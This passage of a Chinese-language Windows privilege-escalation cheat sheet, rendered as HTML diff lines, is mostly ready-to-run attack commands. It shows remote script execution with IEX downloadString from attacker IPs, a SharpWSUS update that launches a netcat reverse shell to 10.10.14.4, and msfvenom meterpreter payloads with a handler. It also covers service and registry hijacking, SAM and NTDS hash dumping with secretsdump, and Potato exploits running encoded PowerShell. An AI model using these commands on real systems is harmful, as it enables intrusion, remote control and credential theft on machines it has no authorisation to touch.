class="hljs-type">ref</span>]<span class="hljs-variable">$key2</span>)<br><span class="hljs-variable">$decrypted</span> = <span class="hljs-variable">$null</span><br><span class="hljs-variable">$key2</span>.DecryptBase64ToString(<span class="hljs-variable">$crypted</span>, [<span class="hljs-type">ref</span>]<span class="hljs-variable">$decrypted</span>)<br><br><span class="hljs-variable">$domain</span> = <span class="hljs-built_in">select-xml</span> <span class="hljs-literal">-Content</span> <span class="hljs-variable">$config</span> <span class="hljs-literal">-XPath</span> <span class="hljs-string">&quot;//parameter[@name=&#x27;forest-login-domain&#x27;]&quot;</span> | <span class="hljs-built_in">select</span> <span class="hljs-selector-tag">@</span>&#123;Name = <span class="hljs-string">&#x27;Domain&#x27;</span>; Expression = &#123;<span class="hljs-variable">$_</span>.node.InnerXML&#125;&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">select-xml</span> <span class="hljs-literal">-Content</span> <span class="hljs-variable">$config</span> <span class="hljs-literal">-XPath</span> <span class="hljs-string">&quot;//parameter[@name=&#x27;forest-login-user&#x27;]&quot;</span> | <span class="hljs-built_in">select</span> <span class="hljs-selector-tag">@</span>&#123;Name = <span class="hljs-string">&#x27;Username&#x27;</span>; Expression = &#123;<span class="hljs-variable">$_</span>.node.InnerXML&#125;&#125;<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">select-xml</span> <span class="hljs-literal">-Content</span> <span class="hljs-variable">$decrypted</span> <span class="hljs-literal">-XPath</span> <span class="hljs-string">&quot;//attribute&quot;</span> | <span class="hljs-built_in">select</span> <span class="hljs-selector-tag">@</span>&#123;Name = <span class="hljs-string">&#x27;Password&#x27;</span>; Expression = &#123;<span class="hljs-variable">$_</span>.node.InnerText&#125;&#125;<br><br><span class="hljs-built_in">Write-Host</span> (<span class="hljs-string">&quot;Domain: &quot;</span> + <span class="hljs-variable">$domain</span>.Domain)<br><span class="hljs-built_in">Write-Host</span> (<span class="hljs-string">&quot;Username: &quot;</span> + <span class="hljs-variable">$username</span>.Username)<br><span class="hljs-built_in">Write-Host</span> (<span class="hljs-string">&quot;Password: &quot;</span> + <span class="hljs-variable">$password</span>.Password)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>如果您是团体成员<code>Event Log Readers</code>。</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/RamblingCookieMonster/PowerShell/master/<span class="hljs-built_in">Get-WinEventData</span>.ps1  <br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).downloadString(<span class="hljs-string">&#x27;http://10.10.14.25/Get-WinEventData.ps1&#x27;</span>)<br><br><span class="hljs-comment"># 显示生成事件的计算机、时间和任何自定义事件数据的简单示例</span><br><span class="hljs-built_in">Get-WinEvent</span> <span class="hljs-literal">-LogName</span> system <span class="hljs-literal">-max</span> <span class="hljs-number">1</span> | <span class="hljs-built_in">Get-WinEventData</span> | <span class="hljs-built_in">Select</span> <span class="hljs-literal">-Property</span> MachineName, TimeCreated, e_*  <br><br><span class="hljs-comment"># 在域控制器上查找锁定事件</span><br><span class="hljs-built_in">Get-WinEvent</span> <span class="hljs-literal">-ComputerName</span> DomainController1 <span class="hljs-literal">-FilterHashtable</span> <span class="hljs-selector-tag">@</span>&#123;Logname=<span class="hljs-string">&#x27;security&#x27;</span>;id=<span class="hljs-number">4740</span>&#125; <span class="hljs-literal">-MaxEvents</span> <span class="hljs-number">10</span> | <span class="hljs-built_in">Get-WinEventData</span> | <span class="hljs-built_in">Select</span> TimeCreated, e_TargetUserName, e_TargetDomainName     <br><br><span class="hljs-comment">#  命令行进程登录（已创建一个新进程）</span><br><span class="hljs-built_in">Get-WinEvent</span> <span class="hljs-literal">-FilterHashtable</span> <span class="hljs-selector-tag">@</span>&#123;Logname=<span class="hljs-string">&#x27;security&#x27;</span>;id=<span class="hljs-number">4688</span>&#125; | <span class="hljs-built_in">Get-WinEventData</span> | <span class="hljs-built_in">Select</span> TimeCreated,MachineName,e_CommandLine | <span class="hljs-built_in">ft</span> <span class="hljs-literal">-autosize</span> <span class="hljs-literal">-wrap</span><br><br><span class="hljs-comment">## 查看此窗口事件代码</span><br>https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>如果你在<code>WSUS Administrators</code>组里？<a target="_blank" rel="noopener" href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">wget</span> https://github.com/h4rithd/PrecompiledBinaries/raw/main/SharpWSUS/SharpWSUS.exe<br><span class="hljs-built_in">wget</span> https://github.com/h4rithd/PrecompiledBinaries/raw/main/PsExec64/PsExec64.exe <span class="hljs-literal">-O</span> psexec.exe                               <br><br>.\SharpWSUS.exe create /payload:<span class="hljs-string">&quot;C:\Users\sflowers\Documents\psexec.exe&quot;</span> /args:<span class="hljs-string">&quot;-accepteula -s -d -accepteula -s -d C:\\Users\\sflowers\\Documents\\nc.exe -e cmd 10.10.14.4 4545&quot;</span> /title:<span class="hljs-string">&quot;LocalUpdate&quot;</span>               <br>.\SharpWSUS.exe approve /updateid:&lt;ID&gt; /computername:&lt;HOSTNAME.DOMAIN&gt; /groupname:<span class="hljs-string">&quot;LocalUpdate&quot;</span><br><span class="hljs-comment">### Wait for 5-6 minutes</span><br>.\SharpWSUS.exe check /updateid:&lt;ID&gt; /computername:&lt;HOSTNAME.DOMAIN&gt;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>如果您是团体成员<code>Administrators</code>，但仍被困住？</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## 列出管理员组成员</span><br>net localgroup Administrators<br><br><span class="hljs-comment">## 使用这种简单的方法绕过UAC</span><br>net use <span class="hljs-built_in">h</span>: \\<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>\c<span class="hljs-variable">$</span><br><span class="hljs-built_in">h</span>:<br><span class="hljs-built_in">dir</span> <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>如果你在<code>LAPS_Readers</code></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-ADComputer</span> <span class="hljs-literal">-Filter</span> * <span class="hljs-literal">-Properties</span> ms<span class="hljs-literal">-Mcs-AdmPwd</span>, ms<span class="hljs-literal">-Mcs-AdmPwdExpirationTime</span><br><br>Computers = <span class="hljs-built_in">Get-ADComputer</span> <span class="hljs-literal">-Filter</span> * <span class="hljs-literal">-Properties</span> ms<span class="hljs-literal">-Mcs-AdmPwd</span>, ms<span class="hljs-literal">-Mcs-AdmPwdExpirationTime</span><br><span class="hljs-variable">$Computers</span> | <span class="hljs-built_in">Sort-Object</span> ms<span class="hljs-literal">-Mcs-AdmPwdExpirationTime</span> | <span class="hljs-built_in">Format-Table</span> <span class="hljs-literal">-AutoSize</span> Name, DnsHostName, ms<span class="hljs-literal">-Mcs-AdmPwd</span>, ms<span class="hljs-literal">-Mcs-AdmPwdExpirationTime</span><br><span class="hljs-variable">$computers</span> | <span class="hljs-built_in">Export-Csv</span> <span class="hljs-literal">-path</span> c:\windows\temp\laps.csv<span class="hljs-string">&quot; -NoTypeInformation</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>劫持&#x2F;迁移登录会话。</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 检查谁登录了机器，有哪些会话可用？ </span><br>tasklist /v <br><br><span class="hljs-comment">## ------------------| 进入会话</span><br><span class="hljs-comment">## Create payload </span><br>msfvenom <span class="hljs-literal">--platform</span> windows <span class="hljs-literal">-a</span> x64 <span class="hljs-literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; <span class="hljs-operator">-f</span> exe &gt; h4rithd.exe   <br>sudo msfdb run <br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST tun0<br><span class="hljs-built_in">set</span> LPORT &lt;PORT&gt;<br>run<br>meterpreter &gt; <span class="hljs-built_in">ps</span><br><span class="hljs-comment">## 搜索explorer.exe；因为它更稳定，然后复制PID值</span><br>migrate &lt;PID&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="01-3-服务-注册表漏洞"><a href="#01-3-服务-注册表漏洞" class="headerlink" title="01.3 服务&#x2F;注册表漏洞"></a>01.3 服务&#x2F;注册表漏洞</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://sohvaxus.github.io/content/winxp-sp1-privesc.html">不安全的服务权限</a></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 枚举[必须具有SERVICE_START和SERVICE_STOP权限]</span><br>.\winPEASany.exe quiet servicesinfo<br><span class="hljs-built_in">Get-WmiObject</span> win32_service | <span class="hljs-built_in">Select-Object</span> Name, State, PathName | <span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span>.State <span class="hljs-operator">-like</span> <span class="hljs-string">&#x27;Running&#x27;</span>&#125; | findstr <span class="hljs-string">&quot;Program&quot;</span>     <br><br><span class="hljs-comment">## ------------------| 检查权限</span><br>icacls <span class="hljs-string">&quot;C:\Program Files\...\&lt;PATH&gt;\..\pro.exe&quot;</span><br><span class="hljs-comment">### Check BUILTIN\Users:(I)(F) permission</span><br><br><span class="hljs-comment">## ------------------| 检查特定的服务名称</span><br>.\accesschk.exe /accepteula <span class="hljs-literal">-uwcqv</span> <span class="hljs-string">&quot;Authenticated Users&quot;</span> *<br>.\accesschk.exe /accepteula <span class="hljs-literal">-uwcqv</span> user &lt;service_name&gt;<br>accesschk.exe /accepteula <span class="hljs-literal">-ucqv</span> &lt;ServiceName&gt;<br><br><span class="hljs-comment">## ------------------| Exploit</span><br><span class="hljs-comment">## 检查当前状态</span><br><span class="hljs-built_in">sc</span> qc &lt;service_name&gt;<br><span class="hljs-built_in">sc</span> query &lt;service_name&gt;<br><span class="hljs-comment">## 设置二进制路径</span><br><span class="hljs-built_in">sc</span> config &lt;service_name&gt; binpath= <span class="hljs-string">&quot;\&quot;</span>C:\Windows\Temp\shell.exe\<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment">## Start service</span><br>net <span class="hljs-built_in">start</span> &lt;service_name&gt; <br><span class="hljs-built_in">sc</span> STOP &lt;service_name&gt;<br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">START</span> &lt;service_name&gt; <br><span class="hljs-comment">## 设置自动启动</span><br><span class="hljs-built_in">sc</span> config &lt;service_name&gt; <span class="hljs-built_in">start</span>= auto<br><span class="hljs-comment">## 删除相关性 </span><br><span class="hljs-built_in">sc</span> config &lt;service_name&gt; depend= <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment">## ------------------| Restart service </span><br>cmd<br>wmic service <span class="hljs-built_in">where</span> caption=<span class="hljs-string">&quot;&lt;ServiceName&gt; get name, caption, state, startmode</span><br><span class="hljs-string">## 如果StartMode为Auto</span><br><span class="hljs-string">## 检查我们是否有重新启动机器的特权</span><br><span class="hljs-string">whoami /priv</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>不安全的服务可执行文件</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Check </span><br><span class="hljs-comment">### RW Everyone / 所有人员均可读写</span><br>.\accesschk.exe /accepteula <span class="hljs-literal">-quvw</span> <span class="hljs-string">&quot;C:\&lt;PATH&gt;.exe&quot;</span><br><span class="hljs-comment">### SERVICE_START &amp; SERVICE_STOP 权限 </span><br>.\accesschk.exe /accepteula <span class="hljs-literal">-uwcqv</span> user &lt;service_name&gt;<br><br><span class="hljs-comment">## ------------------| Exploit</span><br><span class="hljs-comment">## 备份原始文件，然后用shell.exe替换</span><br><span class="hljs-comment">## Start the service</span><br>net <span class="hljs-built_in">start</span> &lt;service_name&gt; <br><span class="hljs-built_in">sc</span> STOP &lt;service_name&gt; <br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">START</span> &lt;service_name&gt; <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/03/09/unquoted-service-path/">不带引号的服务路径</a></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 简介</span><br>C:\Program Files\One Folder\Two Folder\Executable.exe<br>C:\Program.exe<br>C:\Program Files\One.exe<br>C:\Program Files\One Folder\Two.exe<br>C:\Program Files\A Subfolder\Two Folder\Executable.exe<br><br><span class="hljs-comment">## ------------------| 检查未确定的路径</span><br>wmic service get name,displayname,pathname,startmode |findstr /i <span class="hljs-string">&quot;auto&quot;</span> |findstr /i /v <span class="hljs-string">&quot;c:\windows\\&quot;</span> |findstr /i /v <span class="hljs-string">&quot;&#x27;&quot;</span><br><br><span class="hljs-comment">## ------------------| Check if we have </span><br><span class="hljs-comment">### SERVICE_START &amp; SERVICE_STOP 权限</span><br>.\accesschk.exe /accepteula <span class="hljs-literal">-uwcqv</span> user &lt;service_name&gt;<br><span class="hljs-comment">###  写入权限 [RW BUILTIN\Users]</span><br>.\accesschk.exe /accepteula <span class="hljs-literal">-uwcqv</span> <span class="hljs-literal">-uwdq</span> &lt;path&gt;<br><br><span class="hljs-comment">## ------------------| 代替 &amp; start service</span><br><span class="hljs-built_in">move</span> payload.exe <span class="hljs-string">&quot;C:\Program Files\...\&lt;SUB DIR&gt;\&lt;SUB&gt;.exe&quot;</span><br>net <span class="hljs-built_in">start</span> &lt;service_name&gt; <br><span class="hljs-built_in">sc</span> STOP &lt;service_name&gt; <br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">START</span> &lt;service_name&gt; <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>注册表权限较弱</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Verify [Check for RW NT AUTHORITY\INTERACTIVE]</span><br><span class="hljs-built_in">Get-Acl</span> HKLM:\&lt;ServicePath&gt;\&lt;ServiceName&gt; | <span class="hljs-built_in">Format-List</span><br>.\accesschk.exe /accepteula <span class="hljs-literal">-uvwqk</span> HKLM:\&lt;ServicePath&gt;\&lt;ServiceName&gt; <br><br><span class="hljs-comment">## ------------------| Check if we can start the service</span><br>.\accesschk.exe /accepteula <span class="hljs-literal">-ucqv</span> user &lt;ServiceName&gt;<br><br><span class="hljs-comment">## ------------------| Check Current values [ImagePath &amp; ObjectName == LocalSystem]</span><br>reg query HKLM:\&lt;ServicePath&gt;\&lt;ServiceName&gt; <br><br><span class="hljs-comment">## ------------------| Add new value</span><br>reg add HKLM:\&lt;ServicePath&gt;\&lt;ServiceName&gt; /v ImageaPath /t REG_EXPAND_SZ /d C:\Windows\Temp\shell.exe /f    <br>net <span class="hljs-built_in">start</span> &lt;service_name&gt;                <br></code></pre></td></tr></table></figure>
+
+<h2 id="02-工具"><a href="#02-工具" class="headerlink" title="02.工具"></a>02.工具</h2><h3 id="02-1-PowerUp-ps1"><a href="#02-1-PowerUp-ps1" class="headerlink" title="02.1 PowerUp.ps1"></a>02.1 <a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUp.ps1</a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Download and execute</span><br>C:\windows\sysnative\WindowsPowerShell\v1.<span class="hljs-number">0</span>\powershell.exe <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).downloadString(&#x27;http://10.10.14.26/PowerUp.ps1&#x27;)&quot;</span> <br><br><span class="hljs-comment">## ------------------| 手动导入模块</span><br><br><span class="hljs-built_in">Import-Module</span> ./PowerUp.ps1<br><br><span class="hljs-comment">## ------------------| 最佳检查</span><br><span class="hljs-built_in">Invoke-AllChecks</span><br>CurrentUserTokenGroupSid <br><span class="hljs-built_in">Get-RegistryAutoLogon</span><br><br><span class="hljs-comment">## ------------------| Check other functions</span><br><span class="hljs-built_in">cat</span> PowerUp.ps1 | grep <span class="hljs-literal">-Ei</span> <span class="hljs-string">&#x27;^function&#x27;</span> | grep <span class="hljs-string">&#x27;&#123;$&#x27;</span> | grep <span class="hljs-string">&#x27;-&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="02-2-PowerUpSQL"><a href="#02-2-PowerUpSQL" class="headerlink" title="02.2 PowerUpSQL"></a><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL">02.2 PowerUpSQL</a></h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet">单击此处查看备忘单！</a></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Download </span><br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1<br><br><span class="hljs-comment"># Upload </span><br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).downloadString(<span class="hljs-string">&#x27;http://10.10.14.26/PowerUpSQL.ps1&#x27;</span>)<br><br><span class="hljs-comment"># Execute commands</span><br><span class="hljs-built_in">Get-SQLInstanceLocal</span> <span class="hljs-literal">-Verbose</span><br><span class="hljs-built_in">Invoke-SQLUncPathInjection</span> <span class="hljs-literal">-Verbose</span><br><span class="hljs-built_in">Invoke-SQLImpersonateService</span> <span class="hljs-literal">-Verbose</span><br><span class="hljs-built_in">Invoke-SQLEscalatePriv</span> <span class="hljs-literal">-Verbose</span><br><span class="hljs-variable">$Targets</span> | <span class="hljs-built_in">Invoke-SQLOSCLR</span> <span class="hljs-literal">-Verbose</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;Whoami&quot;</span><br><span class="hljs-variable">$Targets</span> | <span class="hljs-built_in">Invoke-SQLOSPython</span> <span class="hljs-literal">-Verbose</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;Whoami&quot;</span><br><span class="hljs-variable">$Targets</span> | <span class="hljs-built_in">Invoke-SQLOSCmdAgentJob</span> <span class="hljs-literal">-Verbose</span> <span class="hljs-literal">-SubSystem</span> CmdExec <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;echo hello &gt; c:\windows\temp\test1.txt&quot;</span><br><span class="hljs-variable">$Targets</span> | <span class="hljs-built_in">Invoke-SQLOSCmdAgentJob</span> <span class="hljs-literal">-Verbose</span> <span class="hljs-literal">-SubSystem</span> PowerShell <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;write-output &quot;hello world&quot; | out-file c:\windows\temp\test2.txt&#x27;</span> <span class="hljs-literal">-Sleep</span> <span class="hljs-number">20</span>     <br></code></pre></td></tr></table></figure>
+
+<h3 id="02-3-Seatbelt-exe"><a href="#02-3-Seatbelt-exe" class="headerlink" title="02.3 Seatbelt.exe"></a>02.3 Seatbelt.exe</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 运行所有枚举检查</span><br>Seatbelt.exe <span class="hljs-literal">-group</span>=all<br></code></pre></td></tr></table></figure>
+
+<h3 id="02-4-秘密转储"><a href="#02-4-秘密转储" class="headerlink" title="02.4 秘密转储"></a>02.4 <strong>秘密转储</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 如果手头有SAM和SYSTEM文件</span><br>impacket<span class="hljs-literal">-secretsdump</span> <span class="hljs-literal">-sam</span> SAM <span class="hljs-literal">-system</span> SYSTEM local<br><br><span class="hljs-comment">## ------------------| Remote</span><br>impacket<span class="hljs-literal">-secretsdump</span> htb.local/h4rithd:<span class="hljs-string">&#x27;Passw0rD$&#x27;</span>@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span><br><br><span class="hljs-comment"># 31d6cfe0d16ae931b73c59d7e0c089c0 &lt;-- blank</span><br><span class="hljs-comment"># aad3b435b51404eeaad3b435b51404ee &lt;-- blank [LM]</span><br><br><span class="hljs-comment">## ------------------| Remote NTDS</span><br><span class="hljs-comment">## Copy ntds file</span><br>robocopy /B C:\Windows\ntds .\ntds ntds.dit<br><span class="hljs-comment">## Copy sam and system file then run</span><br>impacket<span class="hljs-literal">-secretsdump</span> <span class="hljs-literal">-sam</span> SAMFILE <span class="hljs-literal">-system</span> SYSTEMFILE <span class="hljs-literal">-ntds</span> NTDS.DIT local<br><br><span class="hljs-comment">## ------------------| Local NTDS</span><br>impacket<span class="hljs-literal">-secretsdump</span> <span class="hljs-literal">-system</span> ntds.bin <span class="hljs-literal">-ntds</span> ntds.dit local<br><span class="hljs-comment">## ntds.bin: MS Windows注册表文件，NT/2000或更高版本</span><br><span class="hljs-comment">## ntds.dit: 可扩展存储引擎数据库，版本0x620，校验和0x16d44752，页面大小8192，DirtyShutdown，Windows 6.1版</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="03-常见漏洞"><a href="#03-常见漏洞" class="headerlink" title="03.常见漏洞"></a>03.常见漏洞</h2><h3 id="03-0-GodPotato（新）"><a href="#03-0-GodPotato（新）" class="headerlink" title="03.0 GodPotato（新）"></a>03.0 <a target="_blank" rel="noopener" href="https://github.com/BeichenDream/GodPotato">GodPotato</a>（新）</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Download</span><br><span class="hljs-comment">#### .Net4</span><br><span class="hljs-built_in">wget</span> https://github.com/BeichenDream/GodPotato/releases/download/V1.<span class="hljs-number">20</span>/GodPotato<span class="hljs-literal">-NET4</span>.exe <span class="hljs-literal">-O</span> GodPotato.exe<br><span class="hljs-comment">#### .Net3.5</span><br><span class="hljs-built_in">wget</span> https://github.com/BeichenDream/GodPotato/releases/download/V1.<span class="hljs-number">20</span>/GodPotato<span class="hljs-literal">-NET35</span>.exe <span class="hljs-literal">-O</span> GodPotato.exe<br><span class="hljs-comment">#### .Net2</span><br><span class="hljs-built_in">wget</span> https://github.com/BeichenDream/GodPotato/releases/download/V1.<span class="hljs-number">20</span>/GodPotato<span class="hljs-literal">-NET2</span>.exe <span class="hljs-literal">-O</span> GodPotato.exe<br><br><span class="hljs-comment">## ------------------| Exploit</span><br>.\GodPotato.exe <span class="hljs-literal">-cmd</span> <span class="hljs-string">&quot;powershell -EncodedCommand SQBFAFgAKABOA.....ApAA==&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="03-0-JuicyPotatoNG（新）"><a href="#03-0-JuicyPotatoNG（新）" class="headerlink" title="03.0 JuicyPotatoNG（新）"></a>03.0 <a target="_blank" rel="noopener" href="https://github.com/antonioCoco/JuicyPotatoNG">JuicyPotatoNG</a>（新）</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 验证漏洞</span><br>whoami /priv | findstr <span class="hljs-string">&quot;Enabled&quot;</span><br><span class="hljs-comment"># 检查“SeImpersonatePrivilege或SeAssignPrimaryToken是否已启用”，我们很好！！ 👌👌👌</span><br><br><span class="hljs-comment">## ------------------| Download to local machine</span><br><span class="hljs-built_in">wget</span> https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.<span class="hljs-number">1</span>/JuicyPotatoNG.zip                                                             <br>unzip JuicyPotatoNG.zip<br><br><span class="hljs-comment">## ------------------| 上传到受害者的机器上后创建bat文件</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;powershell -EncodedCommand SQBFAFgAKABOA.....ApAA==&quot;</span> &gt; shell.bat<br><span class="hljs-built_in">type</span> C:\programdata\shell.bat<br><br><span class="hljs-comment">## ------------------| Run</span><br>.\JuicyPotatoNG.exe <span class="hljs-literal">-t</span> * <span class="hljs-literal">-p</span> &lt;fullPath&gt;\shell.bat<br></code></pre></td></tr></table></figure>
+
